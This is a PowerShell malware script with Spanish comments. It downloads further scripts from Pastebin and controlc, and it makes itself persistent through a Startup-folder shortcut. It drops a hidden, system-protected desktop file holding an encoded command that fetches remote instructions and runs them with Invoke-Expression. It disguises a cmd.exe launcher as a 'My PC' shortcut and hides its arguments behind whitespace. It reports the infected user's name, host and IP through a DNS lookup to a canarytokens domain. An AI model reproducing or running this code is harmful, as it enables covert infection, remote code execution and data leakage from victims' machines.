cls
# Define la ruta y el nombre del script que deseas agregar
$scriptPath = "%USERPROFILE%\AppData\Local\Temp\MonitorUSB.ps1"

#Descarga los ficheros de PASTEBIN y los pone en su sitio

# URL de los archivos en Pastebin
$url1_usbin = "https://controlc.com/86da6497/fullscreen.php?hash=9b3d20e05b42ce6f5ca77235e8ea3e80&toolbar=true&linenum=false"
$url2_monitor = "https://pastebin.com/raw/KECJLTek"

# Carpeta de destino para los archivos descargados
$destinationFolder = "%USERPROFILE%\AppData\Local\Temp\"

# Crear la carpeta de destino si aún no existe
New-Item -ItemType Directory -Force -Path $destinationFolder

# Descargar el contenido RAW de los archivos desde sus URLs en Pastebin
$file1 = Invoke-WebRequest -Uri  $url1_usbin -UseBasicParsing
$file2 = Invoke-WebRequest -Uri $url2_monitor -UseBasicParsing

# Guardar los archivos descargados en la carpeta de destino
$file1.Content | Out-File -FilePath "$destinationFolder\USBin.ps1"
$file2 | Out-File -FilePath "$destinationFolder\MonitorUSB.ps1"

# Mostrar un mensaje de confirmación
Write-Host "Los archivos se han descargado correctamente en la carpeta $destinationFolder"


# Crea un acceso directo para el script en la carpeta de inicio del usuario
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Script.lnk")
$shortcut.TargetPath = $scriptPath
$shortcut.Save()

#crea un acceso directo tambien en el escritorio para reinfectarse

$charSet="ESETOROENAMORADODELALUNA"
#CREANDO DROPPER
$dropperName = -join ((Get-Random -Count 3 -InputObject $charSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $charSet.ToCharArray()))
# Ruta de la carpeta de escritorio del usuario
$desktopPath = [Environment]::GetFolderPath("Desktop")
$dropperPath = $desktopPath + "\"+$dropperName


$longitudArchivo = 1024
# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"
# Rellenamos el archivo con caracteres aleatorios
$aleatorios = New-Object byte[] $longitudArchivo
$random = New-Object System.Random
$random.NextBytes($aleatorios)
[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)
Write-Host $dropperPath

# Escribimos "start explorer" en una línea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = "calc.exe"
$lineas | Set-Content "$dropperPath"
# Escribimos "start explorer" en una línea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = "powershell.exe -EncodedCommand IwBEAG8AdwBuAGwAbwBhAGQAZQByACAAQwBVAEMASABJAEIARQBSAFIAWQBSAE8AQgBJAE4ADQAKAA0ACgAkAGMAbwBuAHQAZQBuAHQAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUALgBlAHMALwBhAGwAZQByAHQAcwAvAGYAZQBlAGQAcwAvADEANAAzADIAMgA1ADAANwA3ADAAMgA1ADUANgA1ADgANwA1ADUANAAvADcANAA5ADgAOAAzADgAMQA2ADQAOQAzADEAMQA0ADEANgA1ADUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgANAAoADQAKACMAUwBFAEcAVQBOAEQAQQAgAE8AUABDAEkATwBOACAAIwBUAE8ARABPACAAQwBJAFAASABFAFIAIABYAE8AUgANAAoAaQBmACAAKAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoASQBzAE4AdQBsAGwATwByAEUAbQBwAHQAeQAoACQAcgBlAHMAdQBsAHQAYQBkAG8AKQApACkADQAKAHsADQAKACQAYwBvAG4AdABlAG4AdAAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAEEAQgBpAFYAMAByAEgANwAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwANAAoADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgB9AA0ACgANAAoADQAKAA0ACgAkAFQAaQB0AGwAZQAgAD0AIAAiAEMAdQBjAGgAaQBCAGUAcgByAHkAUgBPAGIAaQBuACIADQAKACQATQBlAHMAcwBhAGcAZQAgAD0AIAAiAEQAZQBzAGMAYQByAGcAYQBuAGQAbwAgAGMAbwBtAGEAbgBkAG8AIAAkAHIAZQBzAHUAbAB0AGEAZABvACIADQAKACQAVAB5AHAAZQAgAD0AIAAiAGkAbgBmAG8AIgAgAA0ACgAgACAADQAKAFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkAHcAaQB0AGgAcABhAHIAdABpAGEAbABuAGEAbQBlACgAIgBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAIgApACAAfAAgAG8AdQB0AC0AbgB1AGwAbAANAAoAJABwAGEAdABoACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AaQBkACAAJABwAGkAZAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABQAGEAdABoAA0ACgAkAGkAYwBvAG4AIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBJAGMAbwBuAF0AOgA6AEUAeAB0AHIAYQBjAHQAQQBzAHMAbwBjAGkAYQB0AGUAZABJAGMAbwBuACgAJABwAGEAdABoACkADQAKACQAbgBvAHQAaQBmAHkAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AdwBpAG4AZABvAHcAcwAuAGYAbwByAG0AcwAuAG4AbwB0AGkAZgB5AGkAYwBvAG4ADQAKACQAbgBvAHQAaQBmAHkALgBpAGMAbwBuACAAPQAgACQAaQBjAG8AbgANAAoAJABuAG8AdABpAGYAeQAuAHYAaQBzAGkAYgBsAGUAIAA9ACAAJAB0AHIAdQBlAA0ACgAkAG4AbwB0AGkAZgB5AC4AcwBoAG8AdwBiAGEAbABsAG8AbwBuAHQAaQBwACgAMQAwACwAJABUAGkAdABsAGUALAAkAE0AZQBzAHMAYQBnAGUALAAgAFsAcwB5AHMAdABlAG0ALgB3AGkAbgBkAG8AdwBzAC4AZgBvAHIAbQBzAC4AdABvAG8AbAB0AGkAcABpAGMAbwBuAF0AOgA6ACQAVAB5AHAAZQApAA0ACgANAAoADQAKAA0ACgAjAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgANAAoADQAKAA0ACgBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgA=  "
#TODO meterle de nuevo la persistencia

$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)





# Ruta del archivo .ico que deseas usar como icono del acceso directo
$iconPath = "C:\Windows\System32\imageres.dll"
$iconIndex = 104 # El índice 15 de este archivo es el icono de "Mi PC"



# Nombre del archivo del acceso directo
$linkName = "$env:COMPUTERNAME.lnk"

# Crea el objeto de acceso directo y establece las propiedades
$link = (New-Object -ComObject WScript.Shell).CreateShortcut("$desktopPath\$linkName")
$link.IconLocation = "$iconPath,$iconIndex"
# Establece la propiedad de solo lectura para el archivo del acceso directo
$attribs = [System.IO.FileAttributes]::ReadOnly
$linkFile = Get-Item "$desktopPath\$linkName"
$linkFile.Attributes = $attribs
$targetPath = "C:\Windows\System32\cmd.exe"
$link.RelativePath = ""
$link.TargetPath = $targetPath
$link.WindowStyle = 7
$link.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"



$link.Save()



#Notificamos la persistencia
# Obtener el nombre de usuario actualmente logado
$username = $env:USERNAME
# Obtener la dirección IP de la máquina actual
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString
# Concatenar el subdominio con el nombre de usuario y la dirección IP
$subdomain = "Persist.$env:COMPUTERNAME.$username.$ipAddress.G12.pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"
# Realizar la consulta DNS
$result = Resolve-DnsName -Name $subdomain 
# Mostrar los resultados de la consulta DNS
if ($result) {
    Write-Host "La dirección IP del subdominio $subdomain es $($result.IPAddress)"
} else {
    Write-Host "No se pudo resolver la dirección IP del subdominio $subdomain"
}
